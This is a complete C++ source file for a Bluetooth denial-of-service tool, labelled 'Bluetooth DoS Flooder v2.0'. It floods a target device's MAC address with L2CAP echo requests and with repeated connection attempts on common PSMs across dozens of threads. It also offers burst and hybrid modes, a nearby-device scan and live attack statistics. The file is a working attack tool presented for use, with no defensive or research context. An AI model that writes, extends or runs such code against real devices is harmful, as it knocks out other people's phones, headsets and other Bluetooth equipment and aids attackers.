#include <iostream>
#include <thread>
#include <vector>
#include <atomic>
#include <chrono>
#include <csignal>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/poll.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>

// ========== CONFIGURATION ==========
#define DEFAULT_PACKET_SIZE  600
#define DEFAULT_THREADS      50
#define DEFAULT_ROUNDS_PER_SEC 10
#define BURST_LEN            50
#define CONNECT_TIMEOUT_MS   1500
#define SYNC_DELAY_US        1000
#define STATS_INTERVAL_SEC   5

// ========== GLOBALS ==========
static std::atomic<bool> running{true};
static bdaddr_t local_addr;
static std::atomic<uint64_t> total_requests{0};
static std::atomic<uint64_t> total_fails{0};
static std::chrono::steady_clock::time_point start_time;

// Attack modes
enum AttackMode {
    MODE_L2PING_FLOOD,
    MODE_L2CAP_CONNECT_FLOOD,
    MODE_HYBRID
};

static AttackMode current_mode = MODE_HYBRID;

// ========== SIGNAL HANDLER ==========
void signal_handler(int) {
    if (running) {
        std::cout << "\n[!] Received stop signal. Shutting down..." << std::endl;
        running = false;
    }
}

// ========== L2PING FLOOD THREAD ==========
void l2ping_flood_worker(const std::string& target_mac, int packet_size) {
    char send_buf[L2CAP_CMD_HDR_SIZE + 4096];
    char recv_buf[L2CAP_CMD_HDR_SIZE + 4096];
    
    // Init send buffer
    for (int i = 0; i < packet_size; i++)
        send_buf[L2CAP_CMD_HDR_SIZE + i] = (i % 40) + 'A';
    
    while (running) {
        // Create raw L2CAP socket
        int sk = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP);
        if (sk < 0) continue;
        
        // Bind to local adapter
        struct sockaddr_l2 addr;
        memset(&addr, 0, sizeof(addr));
        addr.l2_family = AF_BLUETOOTH;
        bacpy(&addr.l2_bdaddr, &local_addr);
        
        if (bind(sk, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            close(sk);
            continue;
        }
        
        // Connect to target
        memset(&addr, 0, sizeof(addr));
        addr.l2_family = AF_BLUETOOTH;
        str2ba(target_mac.c_str(), &addr.l2_bdaddr);
        
        if (connect(sk, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            close(sk);
            total_fails++;
            usleep(5000);
            continue;
        }
        
        // Send burst of echo requests
        for (int i = 0; i < BURST_LEN && running; i++) {
            l2cap_cmd_hdr* cmd = (l2cap_cmd_hdr*)send_buf;
            cmd->ident = (uint8_t)(rand() & 0xFF);
            cmd->len = htobs(packet_size);
            cmd->code = L2CAP_ECHO_REQ;
            
            if (send(sk, send_buf, L2CAP_CMD_HDR_SIZE + packet_size, 0) <= 0)
                break;
            total_requests++;
        }
        
        close(sk);
        usleep(SYNC_DELAY_US);
    }
}

// ========== L2CAP CONNECTION FLOOD THREAD ==========
void l2cap_connect_flood_worker(const std::string& target_mac) {
    // Known Bluetooth PSM values to flood
    const uint16_t psms[] = {0x0001, 0x0003, 0x0005, 0x0007, 0x0009, 0x000B, 0x1001, 0x1003};
    const int num_psms = sizeof(psms) / sizeof(psms[0]);
    
    while (running) {
        int sk = socket(PF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
        if (sk < 0) { usleep(5000); continue; }
        
        struct sockaddr_l2 addr;
        memset(&addr, 0, sizeof(addr));
        addr.l2_family = AF_BLUETOOTH;
        bacpy(&addr.l2_bdaddr, &local_addr);
        
        if (bind(sk, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            close(sk);
            usleep(5000);
            continue;
        }
        
        // Try each PSM rapidly
        for (int p = 0; p < num_psms && running; p++) {
            memset(&addr, 0, sizeof(addr));
            addr.l2_family = AF_BLUETOOTH;
            addr.l2_psm = htobs(psms[p]);
            str2ba(target_mac.c_str(), &addr.l2_bdaddr);
            
            // Non-blocking connect attempt
            int flags = fcntl(sk, F_GETFL, 0);
            fcntl(sk, F_SETFL, flags | O_NONBLOCK);
            
            connect(sk, (struct sockaddr*)&addr, sizeof(addr));
            
            // Poll for completion
            struct pollfd pfd = {sk, POLLOUT, 0};
            if (poll(&pfd, 1, 100) > 0) {
                int err = 0;
                socklen_t errlen = sizeof(err);
                getsockopt(sk, SOL_SOCKET, SO_ERROR, &err, &errlen);
                if (err == 0) {
                    total_requests++;
                    // Immediately send data then disconnect
                    const char* data = "FLOOD";
                    send(sk, data, 5, 0);
                }
            }
            
            fcntl(sk, F_SETFL, flags);  // Restore blocking
        }
        
        close(sk);
        usleep(1000);
    }
}

// ========== HYBRID WORKER ==========
void hybrid_worker(const std::string& target_mac, int packet_size, int worker_id) {
    // Even workers = l2ping, odd workers = connect flood
    if (worker_id % 2 == 0)
        l2ping_flood_worker(target_mac, packet_size);
    else
        l2cap_connect_flood_worker(target_mac);
}

// ========== STATS PRINTER ==========
void stats_printer() {
    while (running) {
        std::this_thread::sleep_for(std::chrono::seconds(STATS_INTERVAL_SEC));
        
        auto now = std::chrono::steady_clock::now();
        double elapsed = std::chrono::duration<double>(now - start_time).count();
        uint64_t reqs = total_requests.load();
        uint64_t fails = total_fails.load();
        double rate = reqs / elapsed;
        
        std::cout << "[+] Stats | Total requests: " << reqs 
                  << " | Failed: " << fails 
                  << " | Rate: " << static_cast<int>(rate) << " req/sec"
                  << " | Elapsed: " << static_cast<int>(elapsed) << "s" << std::endl;
    }
}

// ========== SCAN NEARBY DEVICES ==========
void scan_devices() {
    std::cout << "[*] Scanning for Bluetooth devices..." << std::endl;
    
    inquiry_info* ii = nullptr;
    int max_rsp = 10;
    int dev_id = hci_get_route(nullptr);
    
    if (dev_id < 0) {
        std::cerr << "[!] No Bluetooth adapter found" << std::endl;
        return;
    }
    
    int sock = hci_open_dev(dev_id);
    if (sock < 0) {
        std::cerr << "[!] Can't open HCI socket" << std::endl;
        return;
    }
    
    int len = 8;  // 8 seconds inquiry
    int flags = IREQ_CACHE_FLUSH;
    int num_rsp = hci_inquiry(dev_id, len, max_rsp, nullptr, &ii, flags);
    
    if (num_rsp < 0) {
        std::cerr << "[!] Inquiry failed" << std::endl;
    } else {
        for (int i = 0; i < num_rsp; i++) {
            char addr[19] = {0};
            char name[248] = {0};
            ba2str(&ii[i].bdaddr, addr);
            
            if (hci_read_remote_name(sock, &ii[i].bdaddr, sizeof(name), name, 0) < 0)
                snprintf(name, sizeof(name), "[unknown]");
            
            std::cout << "  " << addr << "  -  " << name << std::endl;
        }
    }
    
    free(ii);
    hci_close_dev(sock);
}

// ========== USAGE ==========
void usage(const char* prog) {
    std::cout << "Bluetooth DoS Flooder v2.0 - Advanced C++ Edition" << std::endl;
    std::cout << "Usage: " << prog << " [options] <MAC_ADDRESS>" << std::endl;
    std::cout << std::endl;
    std::cout << "Options:" << std::endl;
    std::cout << "  -t <num>    Threads (default: " << DEFAULT_THREADS << ")" << std::endl;
    std::cout << "  -s <bytes>  Packet size (default: " << DEFAULT_PACKET_SIZE << ")" << std::endl;
    std::cout << "  -r <num>    Rounds per second (default: " << DEFAULT_ROUNDS_PER_SEC << ")" << std::endl;
    std::cout << "  -m <mode>   Attack mode: ping | connect | hybrid (default: hybrid)" << std::endl;
    std::cout << "  -i <hciX>   Bluetooth interface (default: hci0)" << std::endl;
    std::cout << "  --burst <t> <s>  Burst mode: threads seconds" << std::endl;
    std::cout << "  --scan      Scan nearby devices first" << std::endl;
    std::cout << "  -h          Show this help" << std::endl;
    std::cout << std::endl;
    std::cout << "Examples:" << std::endl;
    std::cout << "  " << prog << " AA:BB:CC:DD:EE:FF" << std::endl;
    std::cout << "  " << prog << " -t 100 -r 20 -m ping AA:BB:CC:DD:EE:FF" << std::endl;
    std::cout << "  " << prog << " --burst 200 15 AA:BB:CC:DD:EE:FF" << std::endl;
    std::cout << "  " << prog << " --scan AA:BB:CC:DD:EE:FF" << std::endl;
}

// ========== MAIN ==========
int main(int argc, char* argv[]) {
    // Defaults
    int num_threads = DEFAULT_THREADS;
    int packet_size = DEFAULT_PACKET_SIZE;
    int rounds_per_sec = DEFAULT_ROUNDS_PER_SEC;
    std::string hci_dev = "hci0";
    std::string target_mac;
    bool burst_mode = false;
    int burst_threads = 0;
    int burst_seconds = 0;
    bool do_scan = false;
    std::string mode_str = "hybrid";
    
    // Parse arguments
    for (int i = 1; i < argc; i++) {
        std::string arg = argv[i];
        
        if (arg == "-t" && i + 1 < argc) num_threads = atoi(argv[++i]);
        else if (arg == "-s" && i + 1 < argc) packet_size = atoi(argv[++i]);
        else if (arg == "-r" && i + 1 < argc) rounds_per_sec = atoi(argv[++i]);
        else if (arg == "-m" && i + 1 < argc) mode_str = argv[++i];
        else if (arg == "-i" && i + 1 < argc) hci_dev = argv[++i];
        else if (arg == "--burst" && i + 2 < argc) {
            burst_mode = true;
            burst_threads = atoi(argv[++i]);
            burst_seconds = atoi(argv[++i]);
        }
        else if (arg == "--scan") do_scan = true;
        else if (arg == "-h") { usage(argv[0]); return 0; }
        else if (arg[0] != '-') target_mac = arg;
    }
    
    if (target_mac.empty()) {
        usage(argv[0]);
        return 1;
    }
    
    // Set mode
    if (mode_str == "ping") current_mode = MODE_L2PING_FLOOD;
    else if (mode_str == "connect") current_mode = MODE_L2CAP_CONNECT_FLOOD;
    else current_mode = MODE_HYBRID;
    
    // Set up signal handler
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // Get Bluetooth adapter
    int dev_id = hci_devid(hci_dev.c_str());
    if (dev_id < 0) {
        std::cerr << "[!] Bluetooth device " << hci_dev << " not found" << std::endl;
        return 1;
    }
    
    // Get local address
    if (hci_devba(dev_id, &local_addr) < 0) {
        std::cerr << "[!] Can't get address for " << hci_dev << std::endl;
        return 1;
    }
    
    char local_addr_str[19];
    ba2str(&local_addr, local_addr_str);
    
    // Bring interface up
    int sock = hci_open_dev(dev_id);
    if (sock >= 0) {
        hci_send_cmd(sock, OGF_HOST_CTL, OCF_RESET, 0, nullptr);
        close(sock);
    }
    
    // Optional scan
    if (do_scan) {
        scan_devices();
        std::cout << "[?] Continue attack on " << target_mac << "? (y/n): ";
        char c;
        std::cin >> c;
        if (c != 'y' && c != 'Y') return 0;
    }
    
    start_time = std::chrono::steady_clock::now();
    
    std::cout << "[*] ===== Bluetooth DoS Attack =====" << std::endl;
    std::cout << "[*] Target MAC:   " << target_mac << std::endl;
    std::cout << "[*] Local IF:     " << hci_dev << " (" << local_addr_str << ")" << std::endl;
    std::cout << "[*] Threads:      " << num_threads << std::endl;
    std::cout << "[*] Packet size:  " << packet_size << " bytes" << std::endl;
    std::cout << "[*] Rounds/sec:   " << rounds_per_sec << std::endl;
    std::cout << "[*] Mode:         " << mode_str << std::endl;
    if (burst_mode)
        std::cout << "[*] Burst:        " << burst_threads << " threads x " << burst_seconds << "s" << std::endl;
    std::cout << "[*] Press Ctrl+C to stop" << std::endl;
    std::cout << "[*] ================================" << std::endl;
    
    // Launch stats thread
    std::thread stats_thread(stats_printer);
    
    if (burst_mode) {
        // BURST MODE: Launch all threads at once, wait, then kill
        std::vector<std::thread> workers;
        for (int i = 0; i < burst_threads; i++) {
            switch (current_mode) {
                case MODE_L2PING_FLOOD:
                    workers.emplace_back(l2ping_flood_worker, target_mac, packet_size);
                    break;
                case MODE_L2CAP_CONNECT_FLOOD:
                    workers.emplace_back(l2cap_connect_flood_worker, target_mac);
                    break;
                case MODE_HYBRID:
                    workers.emplace_back(hybrid_worker, target_mac, packet_size, i);
                    break;
            }
        }
        
        std::this_thread::sleep_for(std::chrono::seconds(burst_seconds));
        running = false;
        
        for (auto& t : workers)
            if (t.joinable()) t.join();
        
    } else {
        // CONTINUOUS MODE: Launch threads with sleep between rounds
        while (running) {
            std::vector<std::thread> round_threads;
            
            for (int i = 0; i < num_threads; i++) {
                switch (current_mode) {
                    case MODE_L2PING_FLOOD:
                        round_threads.emplace_back(l2ping_flood_worker, target_mac, packet_size);
                        break;
                    case MODE_L2CAP_CONNECT_FLOOD:
                        round_threads.emplace_back(l2cap_connect_flood_worker, target_mac);
                        break;
                    case MODE_HYBRID:
                        round_threads.emplace_back(hybrid_worker, target_mac, packet_size, i);
                        break;
                }
            }
            
            // Let threads run briefly
            std::this_thread::sleep_for(std::chrono::microseconds(100));
            
            // Detach them (they self-terminate when running=false)
            for (auto& t : round_threads)
                t.detach();
            
            // Wait for next round
            if (running)
                std::this_thread::sleep_for(std::chrono::milliseconds(1000 / rounds_per_sec));
        }
    }
    
    // Cleanup
    stats_thread.join();
    
    auto end = std::chrono::steady_clock::now();
    double elapsed = std::chrono::duration<double>(end - start_time).count();
    
    std::cout << "\n[*] Attack finished." << std::endl;
    std::cout << "[*] Total runtime: " << static_cast<int>(elapsed) << "s" << std::endl;
    std::cout << "[*] Total requests sent: " << total_requests.load() << std::endl;
    std::cout << "[*] Average rate: " << static_cast<int>(total_requests / elapsed) << " req/sec" << std::endl;
    
    return 0;
}
